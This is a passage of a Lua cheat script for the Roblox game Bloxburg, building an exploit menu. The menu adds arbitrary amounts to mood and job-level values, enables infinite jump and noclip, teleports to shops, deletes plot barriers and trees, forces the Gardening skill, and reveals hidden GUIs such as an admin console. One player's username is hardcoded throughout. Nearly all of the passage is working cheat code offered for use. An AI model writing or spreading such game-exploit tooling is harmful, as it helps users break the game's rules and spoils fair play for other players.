local HungerValue = MoodDataFolder and MoodDataFolder:FindFirstChild("Hunger")
local HygieneValue = MoodDataFolder and MoodDataFolder:FindFirstChild("Hygiene")

-- Check if all the values exist
if not EnergyValue or not FunValue or not HungerValue or not HygieneValue then
    return
end

-- Variable to control enabling the mood values
local isEnergyEnabled = false
local isFunEnabled = false
local isHungerEnabled = false
local isHygieneEnabled = false

-- Define Enable Energy Value button
sections.MainSection4:Button({
    Name = "Enable Energy Value",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the Energy Value input?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isEnergyEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define Energy Value Input
sections.MainSection4:Input({
    Name = "Energy Value",
    Placeholder = "Amount",
    AcceptedCharacters = "All", -- Accepts all characters; can be changed to "Numbers" for numeric input only
    Callback = function(input)
        if isEnergyEnabled then
            local inputValue = tonumber(input) -- Convert input to a number
            if inputValue then
                EnergyValue.Value = EnergyValue.Value + inputValue
            end
        end
    end,
}, "Input")

-- Define Enable Fun Value button
sections.MainSection4:Button({
    Name = "Enable Fun Value",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the Fun Value input?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isFunEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define Fun Value Input
sections.MainSection4:Input({
    Name = "Fun Value",
    Placeholder = "Amount",
    AcceptedCharacters = "All", -- Accepts all characters; can be changed to "Numbers" for numeric input only
    Callback = function(input)
        if isFunEnabled then
            local inputValue = tonumber(input) -- Convert input to a number
            if inputValue then
                FunValue.Value = FunValue.Value + inputValue
            end
        end
    end,
}, "Input")

-- Define Enable Hunger Value button
sections.MainSection4:Button({
    Name = "Enable Hunger Value",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the Hunger Value input?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isHungerEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define Hunger Value Input
sections.MainSection4:Input({
    Name = "Hunger Value",
    Placeholder = "Amount",
    AcceptedCharacters = "All", -- Accepts all characters; can be changed to "Numbers" for numeric input only
    Callback = function(input)
        if isHungerEnabled then
            local inputValue = tonumber(input) -- Convert input to a number
            if inputValue then
                HungerValue.Value = HungerValue.Value + inputValue
            end
        end
    end,
}, "Input")

-- Define Enable Hygiene Value button
sections.MainSection4:Button({
    Name = "Enable Hygiene Value",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the Hygiene Value input?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isHygieneEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define Hygiene Value Input
sections.MainSection4:Input({
    Name = "Hygiene Value",
    Placeholder = "Amount",
    AcceptedCharacters = "All", -- Accepts all characters; can be changed to "Numbers" for numeric input only
    Callback = function(input)
        if isHygieneEnabled then
            local inputValue = tonumber(input) -- Convert input to a number
            if inputValue then
                HygieneValue.Value = HygieneValue.Value + inputValue
            end
        end
    end,
}, "Input")


sections.MainSection4:Header({
	Name = "Work Level Values"
})

-- Define services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Get the necessary values
local StatsFolder = ReplicatedStorage:FindFirstChild("Stats")
local Thrus21Folder = StatsFolder:FindFirstChild(LocalPlayer.Name)

-- Job Folder
local JobFolder = Thrus21Folder:FindFirstChild("Job")

-- Ensure the job values exist
local BensIceCreamSeller = JobFolder and JobFolder:FindFirstChild("Jobs") and JobFolder.Jobs:FindFirstChild("BensIceCreamSeller")
local SupermarketStocker = JobFolder and JobFolder:FindFirstChild("Jobs") and JobFolder.Jobs:FindFirstChild("SupermarketStocker")
local SupermarketCashier = JobFolder and JobFolder:FindFirstChild("Jobs") and JobFolder.Jobs:FindFirstChild("SupermarketCashier")
local StylezHairdresser = JobFolder and JobFolder:FindFirstChild("Jobs") and JobFolder.Jobs:FindFirstChild("StylezHairdresser")
local PizzaPlanetDelivery = JobFolder and JobFolder:FindFirstChild("Jobs") and JobFolder.Jobs:FindFirstChild("PizzaPlanetDelivery")
local PizzaPlanetBaker = JobFolder and JobFolder:FindFirstChild("Jobs") and JobFolder.Jobs:FindFirstChild("PizzaPlanetBaker")
local MikesMechanic = JobFolder and JobFolder:FindFirstChild("Jobs") and JobFolder.Jobs:FindFirstChild("MikesMechanic")
local LumberWoodcutter = JobFolder and JobFolder:FindFirstChild("Jobs") and JobFolder.Jobs:FindFirstChild("LumberWoodcutter")
local CleanJanitor = JobFolder and JobFolder:FindFirstChild("Jobs") and JobFolder.Jobs:FindFirstChild("CleanJanitor")
local HutFisherman = JobFolder and JobFolder:FindFirstChild("Jobs") and JobFolder.Jobs:FindFirstChild("HutFisherman")
local CaveMiner = JobFolder and JobFolder:FindFirstChild("Jobs") and JobFolder.Jobs:FindFirstChild("CaveMiner")
local BloxBurgersEmployee = JobFolder and JobFolder:FindFirstChild("Jobs") and JobFolder.Jobs:FindFirstChild("BloxBurgersEmployee")

-- Check if all the job values exist
if not BensIceCreamSeller or not SupermarketStocker or not SupermarketCashier or not StylezHairdresser or
   not PizzaPlanetDelivery or not PizzaPlanetBaker or not MikesMechanic or not LumberWoodcutter or
   not CleanJanitor or not HutFisherman or not CaveMiner or not BloxBurgersEmployee then
    return
end

-- Variable to control enabling the job values
local isBensIceCreamSellerEnabled = false
local isSupermarketStockerEnabled = false
local isSupermarketCashierEnabled = false
local isStylezHairdresserEnabled = false
local isPizzaPlanetDeliveryEnabled = false
local isPizzaPlanetBakerEnabled = false
local isMikesMechanicEnabled = false
local isLumberWoodcutterEnabled = false
local isCleanJanitorEnabled = false
local isHutFishermanEnabled = false
local isCaveMinerEnabled = false
local isBloxBurgersEmployeeEnabled = false

-- Define Enable BensIceCreamSeller button
sections.MainSection4:Button({
    Name = "Enable Bens Ice Cream Seller",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the Bens Ice Cream Seller input?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isBensIceCreamSellerEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define BensIceCreamSeller Input
sections.MainSection4:Input({
    Name = "Bens Ice Cream Seller",
    Placeholder = "Amount",
    AcceptedCharacters = "All",
    Callback = function(input)
        if isBensIceCreamSellerEnabled then
            local inputValue = tonumber(input)
            if inputValue then
                BensIceCreamSeller.Value = BensIceCreamSeller.Value + inputValue
            end
        end
    end,
}, "Input")

-- Define Enable SupermarketStocker button
sections.MainSection4:Button({
    Name = "Enable Supermarket Stocker",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the Supermarket Stocker input?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isSupermarketStockerEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define SupermarketStocker Input
sections.MainSection4:Input({
    Name = "Supermarket Stocker",
    Placeholder = "Amount",
    AcceptedCharacters = "All",
    Callback = function(input)
        if isSupermarketStockerEnabled then
            local inputValue = tonumber(input)
            if inputValue then
                SupermarketStocker.Value = SupermarketStocker.Value + inputValue
            end
        end
    end,
}, "Input")

-- Define Enable SupermarketCashier button
sections.MainSection4:Button({
    Name = "Enable Supermarket Cashier",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the Supermarket Cashier input?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isSupermarketCashierEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define SupermarketCashier Input
sections.MainSection4:Input({
    Name = "Supermarket Cashier",
    Placeholder = "Amount",
    AcceptedCharacters = "All",
    Callback = function(input)
        if isSupermarketCashierEnabled then
            local inputValue = tonumber(input)
            if inputValue then
                SupermarketCashier.Value = SupermarketCashier.Value + inputValue
            end
        end
    end,
}, "Input")

-- Define Enable StylezHairdresser button
sections.MainSection4:Button({
    Name = "Enable Stylez Hairdresser",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the Stylez Hairdresser input?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isStylezHairdresserEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define StylezHairdresser Input
sections.MainSection4:Input({
    Name = "Stylez Hairdresser",
    Placeholder = "Amount",
    AcceptedCharacters = "All",
    Callback = function(input)
        if isStylezHairdresserEnabled then
            local inputValue = tonumber(input)
            if inputValue then
                StylezHairdresser.Value = StylezHairdresser.Value + inputValue
            end
        end
    end,
}, "Input")

-- Define Enable PizzaPlanetDelivery button
sections.MainSection4:Button({
    Name = "Enable Pizza Planet Delivery",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the Pizza Planet Delivery input?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isPizzaPlanetDeliveryEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define PizzaPlanetDelivery Input
sections.MainSection4:Input({
    Name = "Pizza Planet Delivery",
    Placeholder = "Amount",
    AcceptedCharacters = "All",
    Callback = function(input)
        if isPizzaPlanetDeliveryEnabled then
            local inputValue = tonumber(input)
            if inputValue then
                PizzaPlanetDelivery.Value = PizzaPlanetDelivery.Value + inputValue
            end
        end
    end,
}, "Input")

-- Define Enable PizzaPlanetBaker button
sections.MainSection4:Button({
    Name = "Enable Pizza Planet Baker",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the Pizza Planet Baker input?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isPizzaPlanetBakerEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define PizzaPlanetBaker Input
sections.MainSection4:Input({
    Name = "Pizza Planet Baker",
    Placeholder = "Amount",
    AcceptedCharacters = "All",
    Callback = function(input)
        if isPizzaPlanetBakerEnabled then
            local inputValue = tonumber(input)
            if inputValue then
                PizzaPlanetBaker.Value = PizzaPlanetBaker.Value + inputValue
            end
        end
    end,
}, "Input")

-- Define Enable MikesMechanic button
sections.MainSection4:Button({
    Name = "Enable Mike's Mechanic",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Enable the Mike's Mechanic input?",
            Buttons = {
                {
                    Name = "Enable",
                    Callback = function()
                        isMikesMechanicEnabled = true
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

-- Define MikesMechanic Input
sections.MainSection4:Input({
    Name = "Mike's Mechanic",
    Placeholder = "Amount",
    AcceptedCharacters = "All",
    Callback = function(input)
        if isMikesMechanicEnabled then
            local inputValue = tonumber(input)
            if inputValue then
                MikesMechanic.Value = MikesMechanic.Value + inputValue
            end
        end
    end,
}, "Input")


------------------------------------------------------------------------------------------------------------------------------


local tabGroups = {
	TabGroup3 = Window:TabGroup()
}



local tabs = {
	Main = tabGroups.TabGroup3:Tab({ Name = "Player Configuration", Image = "rbxassetid://18821914323" }),
}

local sections = {
	MainSection5 = tabs.Main:Section({ Side = "Left" }),
    MainSection6 = tabs.Main:Section({ Side = "Right" }),
}


-- Infinite Jump Toggle
sections.MainSection5:Toggle({
    Name = "Infinite Jump",
    Default = false,
    Callback = function(value)
        _G.InfiniteJumpEnabled = value
        if value then
            game:GetService("UserInputService").JumpRequest:Connect(function()
                if _G.InfiniteJumpEnabled then
                    local player = game.Players.LocalPlayer
                    if player and player.Character and player.Character:FindFirstChild("Humanoid") then
                        player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                    end
                end
            end)
        end
    end,
}, "InfiniteJump")

-- Noclip Toggle
sections.MainSection5:Toggle({
    Name = "Noclip",
    Default = false,
    Callback = function(value)
        _G.NoclipEnabled = value
        if value then
            local noclipLoop
            noclipLoop = game:GetService("RunService").Stepped:Connect(function()
                if _G.NoclipEnabled then
                    local player = game.Players.LocalPlayer
                    if player and player.Character then
                        for _, v in pairs(player.Character:GetDescendants()) do
                            if v:IsA("BasePart") and v.CanCollide then
                                v.CanCollide = false
                            end
                        end
                    end
                else
                    noclipLoop:Disconnect()
                end
            end)
        end
    end,
}, "Noclip")


------------------------------------------------------------------------------------------------------------------------------





local tabGroups = {
	TabGroup4 = Window:TabGroup()
}



local tabs = {
	Main = tabGroups.TabGroup4:Tab({ Name = "Teleports/Environment", Image = "rbxassetid://18821914323" }),
}

local sections = {
	MainSection7 = tabs.Main:Section({ Side = "Left" }),
    MainSection8 = tabs.Main:Section({ Side = "Right" }),
}

sections.MainSection7:Header({
	Name = "Teleports"
})


sections.MainSection7:Button({
    Name = "Pizza Planet",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Teleports to Pizza Planet",
            Buttons = {
                {
                    Name = "Teleport",
                    Callback = function()
                        local Players = game:GetService("Players")
                        local LocalPlayer = Players.LocalPlayer
                        
                        -- Function for intermediate teleport
                        local function intermediateTeleport(destinationPosition)
                            local character = LocalPlayer.Character
                            if not character or not character:FindFirstChild("HumanoidRootPart") then return end
                        
                            local humanoidRootPart = character.HumanoidRootPart
                            local intermediatePosition = humanoidRootPart.Position + Vector3.new(0, 50, 0)
                        
                            humanoidRootPart.CFrame = CFrame.new(intermediatePosition)
                            task.wait(0.2)
                            humanoidRootPart.CFrame = CFrame.new(destinationPosition)
                        end
                        
                        -- Coordinates
                        local destination = Vector3.new(1087, 14, 250)
                        
                        -- Teleport to the destination
                        intermediateTeleport(destination)
                        
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

sections.MainSection7:Button({
    Name = "Fancy Furniture",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Teleports to Fancy Furniture",
            Buttons = {
                {
                    Name = "Teleport",
                    Callback = function()
                        local Players = game:GetService("Players")
                        local LocalPlayer = Players.LocalPlayer
                        
                        -- Function for intermediate teleport
                        local function intermediateTeleport(destinationPosition)
                            local character = LocalPlayer.Character
                            if not character or not character:FindFirstChild("HumanoidRootPart") then return end
                        
                            local humanoidRootPart = character.HumanoidRootPart
                            local intermediatePosition = humanoidRootPart.Position + Vector3.new(0, 50, 0)
                        
                            humanoidRootPart.CFrame = CFrame.new(intermediatePosition)
                            task.wait(0.2)
                            humanoidRootPart.CFrame = CFrame.new(destinationPosition)
                        end
                        
                        -- Coordinates
                        local destination = Vector3.new(1107, 14, 141)
                        
                        -- Teleport to the destination
                        intermediateTeleport(destination)
                        
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

sections.MainSection7:Button({
    Name = "BEAT NightClub",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Teleports to BEAT NightClub",
            Buttons = {
                {
                    Name = "Teleport",
                    Callback = function()
                        local Players = game:GetService("Players")
                        local LocalPlayer = Players.LocalPlayer
                        
                        -- Function for intermediate teleport
                        local function intermediateTeleport(destinationPosition)
                            local character = LocalPlayer.Character
                            if not character or not character:FindFirstChild("HumanoidRootPart") then return end
                        
                            local humanoidRootPart = character.HumanoidRootPart
                            local intermediatePosition = humanoidRootPart.Position + Vector3.new(0, 50, 0)
                        
                            humanoidRootPart.CFrame = CFrame.new(intermediatePosition)
                            task.wait(0.2)
                            humanoidRootPart.CFrame = CFrame.new(destinationPosition)
                        end
                        
                        -- Coordinates
                        local destination = Vector3.new(1101, 14, 29)
                        
                        -- Teleport to the destination
                        intermediateTeleport(destination)
                        
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

sections.MainSection7:Button({
    Name = "Mikes Motors",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Teleports to Mikes Motors",
            Buttons = {
                {
                    Name = "Teleport",
                    Callback = function()
                        local Players = game:GetService("Players")
                        local LocalPlayer = Players.LocalPlayer
                        
                        -- Function for intermediate teleport
                        local function intermediateTeleport(destinationPosition)
                            local character = LocalPlayer.Character
                            if not character or not character:FindFirstChild("HumanoidRootPart") then return end
                        
                            local humanoidRootPart = character.HumanoidRootPart
                            local intermediatePosition = humanoidRootPart.Position + Vector3.new(0, 50, 0)
                        
                            humanoidRootPart.CFrame = CFrame.new(intermediatePosition)
                            task.wait(0.2)
                            humanoidRootPart.CFrame = CFrame.new(destinationPosition)
                        end
                        
                        -- Coordinates
                        local destination = Vector3.new(1104, 15, 385)
                        
                        -- Teleport to the destination
                        intermediateTeleport(destination)
                        
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

sections.MainSection7:Button({
    Name = "Blox Burger",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Teleports to Blox Burger",
            Buttons = {
                {
                    Name = "Teleport",
                    Callback = function()
                        local Players = game:GetService("Players")
                        local LocalPlayer = Players.LocalPlayer
                        
                        -- Function for intermediate teleport
                        local function intermediateTeleport(destinationPosition)
                            local character = LocalPlayer.Character
                            if not character or not character:FindFirstChild("HumanoidRootPart") then return end
                        
                            local humanoidRootPart = character.HumanoidRootPart
                            local intermediatePosition = humanoidRootPart.Position + Vector3.new(0, 50, 0)
                        
                            humanoidRootPart.CFrame = CFrame.new(intermediatePosition)
                            task.wait(0.2)
                            humanoidRootPart.CFrame = CFrame.new(destinationPosition)
                        end
                        
                        -- Coordinates
                        local destination = Vector3.new(870, 15, 266)
                        
                        -- Teleport to the destination
                        intermediateTeleport(destination)
                        
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

sections.MainSection7:Button({
    Name = "Stylez Hair Dresser",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Teleports To Hair Dresser",
            Buttons = {
                {
                    Name = "Teleport",
                    Callback = function()
                        local Players = game:GetService("Players")
                        local LocalPlayer = Players.LocalPlayer
                        
                        -- Function for intermediate teleport
                        local function intermediateTeleport(destinationPosition)
                            local character = LocalPlayer.Character
                            if not character or not character:FindFirstChild("HumanoidRootPart") then return end
                        
                            local humanoidRootPart = character.HumanoidRootPart
                            local intermediatePosition = humanoidRootPart.Position + Vector3.new(0, 50, 0)
                        
                            humanoidRootPart.CFrame = CFrame.new(intermediatePosition)
                            task.wait(0.2)
                            humanoidRootPart.CFrame = CFrame.new(destinationPosition)
                        end
                        
                        -- Coordinates
                        local destination = Vector3.new(895, 15, 164)
                        
                        -- Teleport to the destination
                        intermediateTeleport(destination)
                        
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

sections.MainSection7:Button({
    Name = "Bloxburg City Hall",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Teleports to City Hall",
            Buttons = {
                {
                    Name = "Teleport",
                    Callback = function()
                        local Players = game:GetService("Players")
                        local LocalPlayer = Players.LocalPlayer
                        
                        -- Function for intermediate teleport
                        local function intermediateTeleport(destinationPosition)
                            local character = LocalPlayer.Character
                            if not character or not character:FindFirstChild("HumanoidRootPart") then return end
                        
                            local humanoidRootPart = character.HumanoidRootPart
                            local intermediatePosition = humanoidRootPart.Position + Vector3.new(0, 50, 0)
                        
                            humanoidRootPart.CFrame = CFrame.new(intermediatePosition)
                            task.wait(0.2)
                            humanoidRootPart.CFrame = CFrame.new(destinationPosition)
                        end
                        
                        -- Coordinates
                        local destination = Vector3.new(990, 15, -230)
                        
                        -- Teleport to the destination
                        intermediateTeleport(destination)
                        
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

sections.MainSection7:Button({
    Name = "Observatory",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Teleports to Observatory",
            Buttons = {
                {
                    Name = "Teleport",
                    Callback = function()
                        local Players = game:GetService("Players")
                        local LocalPlayer = Players.LocalPlayer
                        
                        -- Function for intermediate teleport
                        local function intermediateTeleport(destinationPosition)
                            local character = LocalPlayer.Character
                            if not character or not character:FindFirstChild("HumanoidRootPart") then return end
                        
                            local humanoidRootPart = character.HumanoidRootPart
                            local intermediatePosition = humanoidRootPart.Position + Vector3.new(0, 50, 0)
                        
                            humanoidRootPart.CFrame = CFrame.new(intermediatePosition)
                            task.wait(0.2)
                            humanoidRootPart.CFrame = CFrame.new(destinationPosition)
                        end
                        
                        -- Coordinates
                        local destination = Vector3.new(430, 105, 1217)
                        
                        -- Teleport to the destination
                        intermediateTeleport(destination)
                        
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

sections.MainSection8:Header({
	Name = "Environment"
})


sections.MainSection8:Button({
    Name = "No Rain",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Gets Rid Of Onscreen Rain",
            Buttons = {
                {
                    Name = "Confirm",
                    Callback = function()
                        game:GetService("Workspace").MouseIgnore.RainHolder:Destroy()
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

sections.MainSection8:Button({
    Name = "No Snow",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Gets Rid Of Onscreen Snow",
            Buttons = {
                {
                    Name = "Confirm",
                    Callback = function()
                        game:GetService("Workspace").MouseIgnore.SnowHolder:Destroy()
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})



sections.MainSection8:Header({
	Name = "Plots"
})

sections.MainSection8:Button({
    Name = "Remove Plot Build/Block Barriers",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Removes the Barriers From Plots When In Build Or Block.",
            Buttons = {
                {
                    Name = "Confirm",
                    Callback = function()
                        for _, plot in pairs(game:GetService("Workspace").Plots:GetChildren()) do
                            if plot:IsA("Model") and plot:FindFirstChild("Barrier") then
                                plot.Barrier:Destroy()
                            end
                        end
                        
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

sections.MainSection8:Button({
    Name = "Remove Plot Trees",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Removes the tree Surrounding Your Plot.",
            Buttons = {
                {
                    Name = "Confirm",
                    Callback = function()
                        local parentPath = workspace.Plots.Plot_Thrus21.SmallObjects

                        for _, child in ipairs(parentPath:GetChildren()) do
                            if child.Name == "Tree" then
                                child:Destroy()
                            end
                        end
                        
                        
                        
                        
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})


sections.MainSection8:Button({
    Name = "Plant Anything",
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Allows You To Plant Anything Within A Pot",
            Buttons = {
                {
                    Name = "Confirm",
                    Callback = function()
                        local ReplicatedStorage = game:GetService("ReplicatedStorage")
                        local skillData = ReplicatedStorage:WaitForChild("Stats"):WaitForChild("Thrus21"):WaitForChild("SkillData")
                        
                        if skillData:FindFirstChild("Gardening") and skillData.Gardening:IsA("IntValue") then
                            skillData.Gardening.Value = 10
                            
                        else
                            print("ok bro")
                        end
                        
                        
                        
                        
                        
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

sections.MainSection8:Button({
    Name = "Enable Plot Grass Color Changer", 
    Callback = function()
        Window:Dialog({
            Title = Window.Settings.Title,
            Description = "Allows You To Change Your Plot's Grass Color",
            Buttons = {
                {
                    Name = "Confirm",
                    Callback = function()
                        print("Grass color changer activated!")
                    end,
                },
                {
                    Name = "Cancel",
                }
            }
        })
    end,
})

sections.MainSection8:Colorpicker({
    Name = "Plot Grass Color",
    Default = Color3.fromRGB(255, 0, 0),
    Alpha = 0,
    Callback = function(color, alpha)
        -- Retrieve the plot belonging to the LocalPlayer with "Plot_" prefix
        local plotName = "Plot_" .. LocalPlayer.Name
        local plot = workspace.Plots:FindFirstChild(plotName)
        if plot then
            local ground = plot:FindFirstChild("GroundParts") and plot.GroundParts:FindFirstChild("Ground")
            if ground and ground:IsA("BasePart") then
                ground.Color = color -- Apply the selected color
                print("Changed grass color for " .. plotName .. " to:", color)
            else
                warn("Ground part not found in " .. plotName .. ".")
            end
        else
            warn(plotName .. " not found in workspace.Plots.")
        end
    end,
}, "plotcolor")





------------------------------------------------------------------------------------------------------------------------------





local tabGroups = {
	TabGroup5 = Window:TabGroup()
}



local tabs = {
	Main = tabGroups.TabGroup5:Tab({ Name = "GUI'S", Image = "rbxassetid://18821914323" }),
}

local sections = {
	MainSection8 = tabs.Main:Section({ Side = "Left" }),
    MainSection9 = tabs.Main:Section({ Side = "Right" }),
}

sections.MainSection8:Header({
	Name = "View GUI"
})




sections.MainSection8:Toggle({
    Name = "Admin Console",
    Default = false,
    Callback = function(value)
        -- Notification on toggle status
        Window:Notify({
            Title = Window.Settings.Title,
            Description = (value and "Enabled " or "Disabled ") .. "Toggle"
        })

        -- Access the player's LocalPlayer and GUI
        local player = game:GetService("Players").LocalPlayer
        local gui = player:FindFirstChild("PlayerGui"):FindFirstChild("MainGUI"):FindFirstChild("Console")

        -- Ensure the GUI exists before modifying properties
        if gui then
            if value then
                -- Set Visible and Active properties to true if toggle is enabled
                if not gui.Visible then
                    gui.Visible = true
                end
                if not gui.Active then
                    gui.Active = true
                end
            else
                -- Set Visible and Active properties to false if toggle is disabled
                if gui.Visible then
                    gui.Visible = false
                end
                if gui.Active then
                    gui.Active = false
                end
            end
        else
            warn("The specified GUI does not exist.")
        end
    end,
}, "Toggle")


sections.MainSection8:Toggle({
    Name = "Wardrobe Avatar Customization",
    Default = false,
    Callback = function(value)
        -- Notification on toggle status
        Window:Notify({
            Title = Window.Settings.Title,
            Description = (value and "Enabled " or "Disabled ") .. "Toggle"
        })

        -- Access the player's LocalPlayer and GUI
        local player = game:GetService("Players").LocalPlayer
        local gui = player:FindFirstChild("PlayerGui"):FindFirstChild("MainGUI"):FindFirstChild("Customize")

        -- Ensure the GUI exists before modifying properties
        if gui then
            if value then
                -- Set Visible and Active properties to true if toggle is enabled
                if not gui.Visible then
                    gui.Visible = true
                end
                if not gui.Active then
                    gui.Active = true
                end
            else
                -- Set Visible and Active properties to false if toggle is disabled
                if gui.Visible then
                    gui.Visible = false
                end
                if gui.Active then
                    gui.Active = false
                end
            end
        else
           
        end
    end,
}, "Toggle")

sections.MainSection8:Toggle({
    Name = "Hotbar",
    Default = false,
    Callback = function(value)
        -- Notification on toggle status
        Window:Notify({
            Title = Window.Settings.Title,
            Description = (value and "Enabled " or "Disabled ") .. "Toggle"
        })

        -- Access the player's LocalPlayer and GUI
        local player = game:GetService("Players").LocalPlayer
        local gui = player:FindFirstChild("PlayerGui"):FindFirstChild("MainGUI"):FindFirstChild("HotbarFrame")

        -- Ensure the GUI exists before modifying properties
        if gui then
            if value then
                -- Set Visible and Active properties to true if toggle is enabled
                if not gui.Visible then
                    gui.Visible = true
                end
                if not gui.Active then
                    gui.Active = true
                end
            else
                -- Set Visible and Active properties to false if toggle is disabled
                if gui.Visible then
                    gui.Visible = false
                end
                if gui.Active then
                    gui.Active = false
                end
            end
        else
            
        end
    end,
}, "Toggle")

sections.MainSection8:Toggle({
    Name = "Money Bar",
    Default = false,
    Callback = function(value)
        -- Notification on toggle status
        Window:Notify({
            Title = Window.Settings.Title,
            Description = (value and "Enabled " or "Disabled ") .. "Toggle"
        })

        -- Access the player's LocalPlayer and GUI
        local player = game:GetService("Players").LocalPlayer
        local gui = player:FindFirstChild("PlayerGui"):FindFirstChild("MainGUI"):FindFirstChild("MoneyBar")

        -- Ensure the GUI exists before modifying properties
        if gui then
            if value then
                -- Set Visible and Active properties to true if toggle is enabled
                if not gui.Visible then
                    gui.Visible = true
                end
                if not gui.Active then
                    gui.Active = true
                end
            else
                -- Set Visible and Active properties to false if toggle is disabled
                if gui.Visible then
                    gui.Visible = false
                end
                if gui.Active then
                    gui.Active = false
                end
            end
        else
            
        end
    end,
}, "Toggle")


sections.MainSection8:Toggle({
    Name = "One Billion Visits",
    Default = false,
    Callback = function(value)
        -- Notification on toggle status
        Window:Notify({
            Title = Window.Settings.Title,
            Description = (value and "Enabled " or "Disabled ") .. "Toggle"
        })

        -- Access the player's LocalPlayer and GUI
        local player = game:GetService("Players").LocalPlayer
        local gui = player:FindFirstChild("PlayerGui"):FindFirstChild("MainGUI"):FindFirstChild("RewardFrame_WIP")

        -- Ensure the GUI exists before modifying properties
        if gui then
            if value then
                -- Set Visible and Active properties to true if toggle is enabled
                if not gui.Visible then
                    gui.Visible = true
                end
                if not gui.Active then
                    gui.Active = true
                end
            else
                -- Set Visible and Active properties to false if toggle is disabled
                if gui.Visible then
                    gui.Visible = false
                end
                if gui.Active then
                    gui.Active = false
                end
            end
        else
           
        end
    end,
}, "Toggle")


sections.MainSection8:Toggle({
    Name = "Mood Frame",
    Default = false,
    Callback = function(value)
        -- Notification on toggle status
        Window:Notify({
            Title = Window.Settings.Title,
            Description = (value and "Enabled " or "Disabled ") .. "Toggle"
        })

        -- Access the player's LocalPlayer and GUI
        local player = game:GetService("Players").LocalPlayer
        local gui = player:FindFirstChild("PlayerGui"):FindFirstChild("MainGUI"):FindFirstChild("TopFrame")

        -- Ensure the GUI exists before modifying properties
        if gui then
            if value then
                -- Set Visible and Active properties to true if toggle is enabled
                if not gui.Visible then
                    gui.Visible = true
                end
                if not gui.Active then
                    gui.Active = true
                end
            else
                -- Set Visible and Active properties to false if toggle is disabled
                if gui.Visible then
                    gui.Visible = false
                end
                if gui.Active then
                    gui.Active = false
                end
            end
        else
            warn("The specified GUI does not exist.")
        end
    end,
}, "Toggle")



